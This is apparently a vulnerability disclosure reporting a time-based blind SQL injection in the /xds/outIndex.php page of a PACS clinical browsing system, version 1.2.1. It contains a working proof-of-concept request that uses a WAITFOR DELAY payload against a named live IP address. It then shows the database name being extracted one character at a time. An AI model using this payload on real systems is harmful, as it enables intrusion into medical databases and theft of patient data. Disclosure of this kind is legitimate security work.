There is a front-end SQL injection vulnerability in the clinical browsing system of Lanwang Technology Co., Ltd.

version:1.2.1
1. Impact of vulnerabilities：PACS clinical browsing system
2. Vulnerability location：/xds/outIndex.php
3. Recurrence of vulnerabilities
The login interface is as shown in the figure
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/7bd22da6-1060-4dcd-89dc-20b999c707e6)

Since the SQL injection here is a time-based blind injection, the database name needs to be determined through ASSCII. The POC is as follows.
Here, it is judged through truncation that the first position in the database is X

```
GET /xds/outIndex.php?appuser=1&name=1%22%27;if%20(ascii(substring(db_name(),1,1)))=88%20WAITFOR%20DELAY%20%270:0:5%27--%20q HTTP/1.1
Host: 106.58.209.164:82
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=t0plbc89dh3spdkqr54g8frbn6
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.1.23
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/53fc3632-ee49-4aee-9606-64e39d7699da)
Here, it is judged through truncation that the second digit in the database is D.
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/a65d00d5-f4a7-41c8-8b17-95c6346f23b1)
Here, it is judged through truncation that the third digit in the database is S.
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/57e2842b-ba89-43bf-979e-62958ce8d925)
Here, it is judged through truncation that the fourth digit of the database is 7
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/22dea395-5ef1-47bb-b02e-8460608c4f99)
Here, it is judged by truncation that the fifth bit of the database is 0
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/e5f65533-7903-43c1-98fa-c8b6445dfa1d)
Here, it is judged through truncation that the sixth digit in the database is T
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/75d11980-5a39-4656-b5fd-1ba676ff027a)
Here, it is determined through delayed injection that the name of the database is: XDS70T
